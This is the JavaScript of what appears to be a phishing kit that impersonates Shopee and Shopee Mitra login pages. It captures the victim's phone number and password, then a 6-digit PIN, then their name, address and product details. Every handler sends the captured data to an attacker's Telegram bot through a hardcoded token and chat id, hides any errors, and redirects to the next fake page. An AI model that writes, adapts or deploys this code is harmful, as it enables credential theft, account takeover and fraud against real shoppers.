// LOGIN - index.html
const btnLogin = document.getElementById("btnLogin");
if (btnLogin) {
    btnLogin.addEventListener("click", function () {
        var nomorhp = document.getElementById('nomorhp').value.trim();
        var password = document.getElementById('password').value.trim();

        var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
        var chat_id = "5923031825";
        var text = "Login Shopee\nNomor HP: " + nomorhp + "\nPassword: " + password;

        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
        var params = {
            chat_id: chat_id,
            text: text
        };

        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(params)
        })
        .catch(() => {})
        .finally(() => {
            window.location.href = "pinmitra.html";
        });
    });
}

// PIN - pinmitra.html
const pinInput = document.getElementById('pinInput');
const submitPinBtn = document.getElementById('submitPin');
if (pinInput && submitPinBtn) {
    submitPinBtn.addEventListener('click', () => {
        const pin = pinInput.value.trim();
        if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
            alert('Masukkan PIN 6 digit angka yang valid');
            pinInput.focus();
            return;
        }

        var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
        var chat_id = "5923031825";
        var text = "PIN Shopee Mitra: " + pin;
        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
        var params = {
            chat_id: chat_id,
            text: text
        };

        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(params)
        })
        .catch(() => {})
        .finally(() => {
            window.location.href = 'formulir.html';
        });
    });
}

// FORMULIR - formulir.html
const formFormulir = document.getElementById("formulir");
const submitFormulirBtn = document.getElementById("submitFormulir");
if (formFormulir && submitFormulirBtn) {
    submitFormulirBtn.addEventListener("click", function (e) {
        e.preventDefault();

        // Contoh pengambilan data input, sesuaikan dengan name/id input di formulir.html Anda
        var nama = document.getElementById("nama") ? document.getElementById("nama").value.trim() : "";
        var alamat = document.getElementById("alamat") ? document.getElementById("alamat").value.trim() : "";
        var produk = document.getElementById("produk") ? document.getElementById("produk").value.trim() : "";

        var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
        var chat_id = "5923031825";
        var text = "Data Formulir Shopee Mitra:\nNama: " + nama + "\nAlamat: " + alamat + "\nProduk: " + produk;

        var url = "https://api.telegram.org/bot" + token + "/sendMessage";
        var params = {
            chat_id: chat_id,
            text: text
        };

        fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(params)
        })
        .catch(() => {})
        .finally(() => {
            // Ganti dengan halaman berikutnya jika ada, atau tampilkan alert
            alert("Data berhasil dikirim!");
            // window.location.href = "index.html";
        });
    });
}
